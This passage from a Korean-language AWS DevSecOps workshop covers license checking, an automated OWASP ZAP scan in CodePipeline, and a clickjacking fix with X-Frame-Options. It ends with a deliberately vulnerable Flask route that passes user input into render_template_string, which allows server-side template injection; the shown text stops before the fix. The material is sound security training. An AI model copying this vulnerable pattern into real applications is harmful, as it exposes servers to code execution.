**[Buildspecs](https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html)**  은 CodeBuild가 빌드를 실행하는 데 사용하는 빌드 명령 및 관련 설정 모음입니다. 각 섹션을 살펴보겠습니다.

-   **pre_build** 명령은 기본적으로 빌드 준비를 실행하는 곳입니다. 이 경우에는 CodeBuild에 **[Python License Checker(liccheck)](https://pypi.org/project/liccheck/) )** 를 설치하도록 지시했습니다. 이를 통해 CodeBuild는 종속성에 대한 라이선스 분석을 실행할 수 있습니다.
-   **build** 명령은 도커 이미지를 생성하는 동안 설치될 종속성을 나열하는 **requirements.txt**에서 **liccheck**를 사용하여 종속성 스캔 실행을 정의합니다.

**license_check_buildspec.yaml**과 동일한 폴더에 **license_strategy.ini**라는 이름의 파일이 있으며, 어떤 라이선스가 승인, 무단 및 제외되는지 정의합니다.

```yaml
# Authorized and unauthorized licenses in LOWER CASE
[Licenses]
authorized_licenses:
        bsd
        new bsd
        bsd license
        new bsd license
        simplified bsd
        apache
        apache 2.0
        apache software license
        gnu lgpl
        lgpl with exceptions or zpl
        isc license
        isc license (iscl)
        mit
        mit license
        python software foundation license
        python software foundation
        zpl 2.1

unauthorized_licenses:
        gpl v3

[Authorized Packages]
# Python software license (see http://zesty.ca/python/uuid.README.txt)
uuid: 1.30
importlib-metadata: *
```

런타임 중에 CodeBuild 종속성을 설치하는 것은 때때로 비효율적이고 시간이 많이 소요될 수 있습니다. 종속성이 이미 구워지고 빌드 속도를 높일 준비가 된 사용자 지정 CodeBuild 이미지를 생성하도록 선택할 수 있습니다. 기본 CodeBuild 이미지의 기능을 추가로 확장하기 위해 이 작업을 수행할 수도 있습니다. 참조: **[사용자 지정 빌드 환경](https://aws.amazon.com/blogs/devops/extending-aws-codebuild-with-custom-build-environments/)**

# 7. Dynamic Application Security Testing (DAST)

이 실습에서는 잠재적인 보안을 식별하기 위해 웹 애플리케이션을 자동으로 테스트하는 **[Dynamic Application Security Testing(DAST)](https://en.wikipedia.org/wiki/Dynamic_application_security_testing) **의 개념을 소개합니다. 취약점. DAST는 알려진 익스플로잇에 대해 웹 애플리케이션의 인터페이스를 스캔하고 테스트할 때 웹 애플리케이션을 테스트하는 **[블랙 박스](https://en.wikipedia.org/wiki/Black-box_testing)**  방법입니다. SAST와 달리 DAST는 소스 코드를 스캔하지 않습니다. **[침투 테스트](https://en.wikipedia.org/wiki/Penetration_test) **라고도 합니다.

**[OWASP Zed Attack Proxy](https://www.zaproxy.org/) **라는 무료 오픈 소스 DAST 도구를 사용하여 릴리스 파이프라인에 추가합니다. 침투 테스트는 일반적으로 수동으로 수행되거나 보안 팀과 함께 예약되지만 요즘에는 보안 코딩 관행을 일찍 도입하고 변경 사항이 게시될 때마다 자동으로 실행하면 보안 코딩 관행을 더욱 강화할 수 있습니다. 보안 팀에 전달하기 전에 침투 테스트 결과를 수정하면 처리 시간이 확실히 단축됩니다.

#### Topics Covered


이 실습을 마치면 다음을 수행할 수 있습니다.:

-   DAST(Dynamic Application Security Testing)의 개념 및 이점 이해
-   CodeBuild를 사용하여 [OWASP Zed Attack Proxy](https://www.zaproxy.org/)  스캔 자동화

# DAST 활성화

DAST(Dynamic Application Security Testing)는 애플리케이션 런타임 중에 수행되므로 스테이징 환경에서 웹 애플리케이션을 배포하기 위해 파이프라인을 업데이트해야 합니다. 이 워크샵에서는 Fargate의 Amazon ECS를 사용하여 웹 애플리케이션을 배포합니다. 또한 웹 애플리케이션이 배포되고 정상으로 표시되는 즉시 분석을 수행하는 DAST 단계를 활성화할 것입니다. 이 섹션이 끝나면 DevSecOps 파이프라인의 최종 상태에 도달해야 합니다.

![pipeline-endstate](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/pipeline-endstate.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

AWS Cloud9로 돌아가서 **pipeline** 폴더에서 **config.yaml**을 업데이트하고 **2행**에서 **auto_deploy_staging**을 **False**에서 **True**로 설정합니다. 그러면 파이프라인에 배포 및 DAST 단계를 포함하는 데 필요한 구성이 활성화됩니다. 이때까지 config.yaml은 다음과 같아야 합니다.

```yaml
### Staging Auto-Deploy
auto_deploy_staging: True
initial_image: public.ecr.aws/adelagon/flask-app:latest

### Static Application Security Testing (SAST) Step
sast:
  enabled: True
  sonarqube:
    image: public.ecr.aws/adelagon/sonarqube:lts-community
    token: 1ecf.......60f2

### Software Composition Analysis (SCA) Step
sca:
  enabled: True

### License Checker Step
license:
  enabled: True

### Dynamic Application Security Testing (DAST) Step
dast:
  enabled: True
  zaproxy:
    instance_type: t3.medium
    api_key: SomeRandomString
```

2.  **config.yaml**을 저장하고 터미널 창에서 **cdk deploy**를 실행하여 새 토큰으로 CodeBuild 프로젝트를 업데이트합니다.

```bash
1
2
cd ~/environment/pipeline
cdk deploy --require-approval never
```

3.  _cdk deploy_가 성공적으로 완료되면 AWS CodePipeline 콘솔의 _BuildImage_ 바로 다음에 **devsecops-pipeline**에 두 개의 추가 단계가 표시되어야 합니다.

![cdk-enable-dast](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/cdk-enable-dast.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

# DAST 수행

웹 애플리케이션 배포 단계를 방금 추가했기 때문에

1.  AWS CodePipeline 콘솔로 이동하여 **devsecops-pipeline**을 엽니다. 오른쪽 상단의 **Release Change** 버튼을 클릭한 다음 확인 상자가 나타나면 **Release**를 누릅니다. AWS CodeCommit의 최신 변경 사항으로 파이프라인을 실행해야 합니다. 그러나 이번에는 웹 애플리케이션도 배포하고 DAST를 수행합니다.

![dast-release-change](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/dast-release-change.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  파이프라인이 완료되면 식별된 **MEDIUM** 또는 **HIGH** 위험으로 인해 **DAST** 단계가 실패했음을 알 수 있습니다. 결과에 대한 HTML 보고서를 생성하고 이를 S3 버킷에 업로드하도록 CodeBuild를 구성했습니다. 보고서를 다운로드하려면 **View in CodeBuild** 링크를 클릭하세요.

![dast-failed](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/dast-failed.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  프로젝트 빌드 페이지에서 **Build details** 탭을 클릭합니다.

![detail-tab](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/detail-tab.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

4.  **Artifacts** 섹션까지 아래로 스크롤하면 생성된 HTML 보고서가 포함된 **S3 Bucket**에 대한 링크가 있음을 알 수 있습니다. 제공된 S3 링크를 클릭합니다.

![detail-artifact](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/detail-artifact.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

5.  새 브라우저 탭이 열리고 S3 객체로 직접 연결됩니다. S3 개체를 클릭합니다.

![s3-object](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/s3-object.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

6.  그런 다음 **Download** 버튼을 클릭하여 S3 객체를 다운로드합니다.

![s3-download](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/s3-download.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

7.  S3 개체는 실제로 **zip archive**입니다. 압축을 풀면 OWASP Zap HTML 보고서가 표시됩니다. 잠재적인 **[Clickjacking](https://en.wikipedia.org/wiki/Clickjacking)**  취약점에 대해 경고하는 **Medium** 위험 결과가 있습니다. 다음 섹션에서 이 문제를 수정하겠습니다.

![zap-report](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/zap-report.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

특정 **branch**에 대해 특정 작업을 실행하려는 경우 AWS CodePipeline에서 다른 파이프라인을 생성할 수 있습니다. 초기 릴리스의 속도를 높이기 위해 분기 전략에 따라 일부 단계를 건너뛰도록 지정할 수 있습니다.

# 클릭 재킹 방지

**OWASP Zap**은 우리 웹 애플리케이션이 [클릭재킹 공격](https://owasp.org/www-community/attacks/Clickjacking) 에 취약하다는 것을 확인했습니다. 클릭재킹의 목표는 사용자가 인식하는 것과 다른 것을 클릭하도록 속이는 것입니다. 그러면 공격자가 사용자가 알지 못하는 사이에 원치 않는 행동을 하도록 유도할 수 있습니다(예: 공격자의 계정으로 자금 이체).

문제를 해결하기 위해 **[X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)**  응답을 추가합니다. 헤더는 **SAMEORIGIN**으로 모든 응답에 설정됩니다. 이것은 귀하의 페이지가 다른 도메인을 가진 다른 웹사이트에 포함될 수 없음을 브라우저에 표시합니다.

**X-Frame-Options** 헤더는 실제로 **[Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)**  로 대체됩니다. 하지만 이 글을 쓰는 시점에서 OWASP Zap은 CSP 헤더가 제대로 설정되어있어도 알람을 설정하고 있습니다.

1.  **flask-app** 폴더 아래에서 **app.py**를 편집하고 코드를 다음으로 교체합니다.

```python
import os
from flask import Flask

from pages import (
    index,
    about,
    a1,
    a2,
    a3,
    a5,
    a6,
    a7,
    a9
)

import models
from flask_wtf.csrf import CSRFProtect

### Initialize App
app = Flask(__name__)
app.url_map.strict_slashes = False

### Enable CSRF
app.config['SECRET_KEY'] = os.urandom(32)
csrf = CSRFProtect()
csrf.init_app(app)


### Register blueprints
app.register_blueprint(index.bp)
app.register_blueprint(about.bp, url_prefix="/about")
app.register_blueprint(a1.bp, url_prefix="/owasp")
app.register_blueprint(a2.bp, url_prefix="/owasp")
app.register_blueprint(a3.bp, url_prefix="/owasp")
app.register_blueprint(a5.bp, url_prefix="/owasp")
app.register_blueprint(a6.bp, url_prefix="/owasp")
app.register_blueprint(a7.bp, url_prefix="/owasp")
app.register_blueprint(a9.bp, url_prefix="/owasp")

### Configure database
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///user.db"
models.db.init_app(app)
models.db.app = app
models.bootstrap(app)

### Add Security Headers
@app.after_request
def add_security_headers(r):
    r.headers['X-Frame-Options'] = 'SAMEORIGIN'
    return r
```

2.  방금 추가한 강조 표시된 코드 줄은 Flask 애플리케이션이 **X-Frame-Options** 헤더를 모든 응답에 추가하도록 합니다. **app.py**를 저장하고 Cloud9 터미널 창에 다음 명령을 입력하여 이러한 변경 사항을 게시해 보겠습니다.

```bash
cd ~/environment/flask-app
git commit -a -m"Add Security Headers"
git push
```

3.  그러면 파이프라인이 자동으로 트리거됩니다. AWS CodePipeline으로 이동하여 진행 상황을 지켜보십시오. 모든 것이 정상이면 DAST 단계가 성공해야 합니다.

![dast-success](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/dast-success.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

**축하합니다!** 보안 도구로 자동 식별된 모든 보안 문제를 해결했습니다. 다음 모듈에서는 파이프라인에서 감지하지 못한 나머지 보안 문제를 다룰 것입니다.

# 부록: dast_buildspec.yaml 탐색

침투 테스트를 자동으로 실행하도록 CodeBuild에 지시한 방법이 궁금하십니까?

**flask-app** 폴더 아래에 **dast_buildspec.yaml**이라는 파일을 확인하면 이를 가능하게 하기 위해 작성된 CodeBuild 빌드 사양을 볼 수 있습니다.

![dast-buildspec](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/dast-buildspec.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

DAST CodeBuild 프로젝트는 이 파일을 찾고 필요한 명령을 실행합니다.

```yaml
version: 0.2

phases:
  pre_build:
    commands:
      - |
        echo "Deleting Alerts from last session"
        curl -s "$ZAP_API_URL/JSON/alert/action/deleteAllAlerts/?apikey=$ZAP_API_KEY"
        echo "Starting Active Scan for: $SCAN_URL"
        curl -s "$ZAP_API_URL/JSON/core/action/accessUrl/?apikey=$ZAP_API_KEY&url=$SCAN_URL&followRedirects=false" > /dev/null
        scanId=$(curl -s "$ZAP_API_URL/JSON/ascan/action/scan/?apikey=$ZAP_API_KEY&zapapiformat=JSON&formMethod=GET&url=$SCAN_URL&recurse=&inScopeOnly=false&scanPolicyName=&method=&postData=&contextId=" | jq -r '.scan')
        echo "Waiting for results. OWASP Scan ID: $scanId"

        while [ "$status" != "100" ];
        do
          status=$(curl -s "$ZAP_API_URL/JSON/ascan/view/status/?apikey=$ZAP_API_KEY&scanId=$scanId" | jq -r '.status')
          echo "Scan Progress at $status%..."
          sleep 3
        done
        echo "DONE!"
  build:
    commands:
      - |
        high_alerts=$(curl -s "$ZAP_API_URL/JSON/alert/view/alertsSummary/?apikey=$ZAP_API_KEY&baseurl=$SCAN_URL" | jq -r '.alertsSummary.High')
        medium_alerts=$(curl -s "$ZAP_API_URL/JSON/alert/view/alertsSummary/?apikey=$ZAP_API_KEY&baseurl=$SCAN_URL" | jq -r '.alertsSummary.Medium')
        
        if [ $high_alerts -gt 0 ] || [ $medium_alerts -gt 0 ];
        then
          echo "There are $high_alerts High and $medium_alerts Medium Alerts. Failing Build..."
          exit 1;
        fi
  post_build:
    commands:
      - |
        echo "Generating HTML report..."
        dt=$(date +%F-%H%M%S)
        curl -s "$ZAP_API_URL/OTHER/core/other/htmlreport/?apikey=$ZAP_API_KEY" > report_$dt.html
        echo "HTML report saved: report_$dt.html"
artifacts:
  files:
    - "*.html"
```

**[Buildspecs](https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html)**  은 CodeBuild가 빌드를 실행하는 데 사용하는 빌드 명령 및 관련 설정 모음입니다. . 각 섹션을 살펴보겠습니다.

-   **pre_build** 명령은 기본적으로 빌드 준비를 실행하는 곳입니다. 이 경우 **[OWASP Zap Proxy's REST API](https://www.zaproxy.org/) 를 사용하여 CodeBuild가 Active Scan을 트리거하도록 지시했습니다. docs/api/#zap-api-ascan)** 그런 다음 상태 API를 폴링하여 스캔이 완료되었는지 확인합니다.
-   **build** 명령은 Active Scan의 결과를 쿼리하고 구문 분석한 곳입니다. MEDIUM 또는 HIGH 위험 결과가 있는 경우 빌드가 강제로 실패합니다.
-   **post_build** 명령은 OWASP Zap이 로컬 HTML 파일에 저장하는 HTML 보고서를 생성하도록 요청하는 곳입니다.
-   **artifacts** 섹션은 모든 HTML 파일을 해당 환경으로 수집하는 아티팩트를 생성하도록 CodeBuild에 거의 알립니다.

**$** 접두사로 표시되는 몇 가지 환경 변수가 있습니다. 이는 Build 프로젝트가 실행될 때마다 AWS CodeBuild에서 정의하고 제공합니다. **codebuild-docker-project**의 Build Details 페이지에 있는 **Environment Variables** 섹션에서 이를 확인할 수 있습니다. CodeBuild에서 사용할 수 있는 [내장 환경 변수](https://docs.aws.amazon.com/codebuild/latest/userguide/build-env-ref-env-vars.html) 도 있습니다. $AWS_DEFAULT_REGION).

# 8. 보안 코드 리뷰

SAST, DAST, SCA 및 라이선스 확인과 같은 자동화된 보안 도구는 코드베이스 내에서 보안 문제를 식별하는 데 필요한 노력의 양을 크게 줄일 수 있습니다. 그러나 이러한 도구의 사용은 여러분들이 해야하는 여러 보안 업무 중 가장 기본적인 업무에 한해서만 도움을 줄 수 있습니다. **[보안 코드 리뷰](https://www.mitre.org/publications/systems-engineering-guide/enterprise-engineering/systems-engineering-for-mission-assurance/secure-code-review)**  를 사용하여 자동화된 보안 도구를 보강해야 하는 아주 좋은 이유가 여기에 있습니다. 왜냐하면 일부 보안 문제는 비즈니스 로직 내에 포함되거나 자동화된 보안 도구가 감지할 수 없는 방식으로 추상화될수 있기 때문입니다.

소규모 회사의 경우 **[OWASP Top 10](https://owasp.org/www-project-top-ten/)**  나 **[Mitre Top 25](https://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html)**  과 같은 보안 코딩 지침에 따라 피어 코드 검토를 통해 보안 코드 검토를 수행할 수 있습니다.

더 많은 인력을 확보할 수 있는 사치품이 있는 중대형 기업의 경우. 보안 코드 검토는 숙련된 개발자이자 SME(특정 기술 전문가)인 핵심 보안팀에서 수행할 수 있습니다. 그러나 시간이 지남에 따라 모든 개발자에게 보안 코딩 지식을 전달하는 것이 처리 시간을 줄이는 것이 중요해집니다.

이 모듈에서는 보안 테스트 도구에서 감지하지 못한 나머지 취약점을 검토하고 수정한 후 마지막으로 수정 사항을 확인합니다.

# SSTI 취약점 수정

**flask-app** 프로젝트에서 **pages/a1.py**를 열면:

```python
from flask import (
    Blueprint,
    request,
    render_template_string
)

bp = Blueprint(
    "a1", __name__,
    template_folder='templates',
    static_folder='static'
)

@bp.route("/A1")
def a1():
    ### Server-Side Template Injection
    name = request.args.get("name", "")
    with open("templates/a1.html") as f:
        template = f.read()
    content = template.replace("{{ name }}", name)
    return render_template_string(content)
```

